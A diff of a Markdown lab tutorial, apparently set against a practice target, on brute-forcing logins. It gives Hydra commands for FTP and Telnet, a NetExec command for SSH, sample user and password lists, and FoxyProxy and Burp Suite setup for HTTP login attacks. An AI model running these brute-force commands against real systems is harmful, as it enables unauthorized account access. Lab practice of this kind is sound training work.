@@ -55,7 +55,7 @@ touch userlist.txt
 vim userlist.txt  
 ```
    - **Insert in userlist.txt**
-```
+```bash
 admin
 msfadmin
 anonymous
@@ -63,13 +63,13 @@ user
 test
 ```
 
-- **Password list** 
+- **Password list:** 
 ```bash
 touch passlist.txt
 vim passlist.txt
 ```
-   - **Insert in passlist.txt**
-```
+   - **Insert in passlist.txt:**
+```bash
 1234
 msfadmin
 ftp123
@@ -84,25 +84,38 @@ Command to attack FTP:
 ```bash
 hydra -L userlist.txt -P passlist.txt ftp://<TARGET_IP> -V
 ```
-   ![alt text](Screenshots/hydra.png)
+   ![alt text](Screenshots/hydra_ftp.png)
 
 ## 🔹 2.2 Telnet Brute Force with Hydra
 Command to attack Telnet:
 ```bash
 hydra -L userlist.txt -P passlist.txt telnet://<TARGET_IP> -V
 ```
-![image](https://github.com/user-attachments/assets/0d3223f5-d120-408c-ab08-b0b93d67127c)
+   ![alt text](Screenshots/hydra_telnet.png)
 
 ## 🔹 2.3 SSH Brute Force with NetExec
 Command to attack SSH:
 ```bash
 nxc ssh <TARGET_IP> -u userlist.txt -p passlist.txt
 ```
-![Screenshot 2025-04-10 213136](https://github.com/user-attachments/assets/b9a82523-a2a4-4619-8c0e-3434a899d9f1)
+   ![alt text](Screenshots/nxc_ssh.png)
 
 ## 🔹 2.4 HTTP Login Brute Force Using Burp Suite Intruder
 
-### Step 1: Launch Burp’s Browser
+### Step 1: Install FoxyProxy Extension
+- Open **Mozilla Firefox Browser.**
+- Go to **extension** and search **FoxyProxy.**
+- Choose the **FoxyProxy Standard** extension and click **Add to Firefox.**
+- Go to `FoxyProxy extension > Options > Proxies`.
+- Fill in the **Title:foxyproxy, Hostname:127.0.0.1, Port:8080** and click **Save.**
+- Go to **FoxyProxy extension** and click **foxyproxy.**
+   ![alt text](Screenshots/foxyproxy1.png)
+   ![alt text](Screenshots/foxyproxy2.png)
+   ![alt text](Screenshots/foxyproxy3.png)
+   ![alt text](Screenshots/foxyproxy4.png)
+   ![alt text](Screenshots/foxyproxy5.png)
+
+### Step 2: Launch Burp’s Browser
 - Open **Burp Suite**.
 - Go to `Proxy > Intercept`.
 - Ensure **Intercept is ON**.
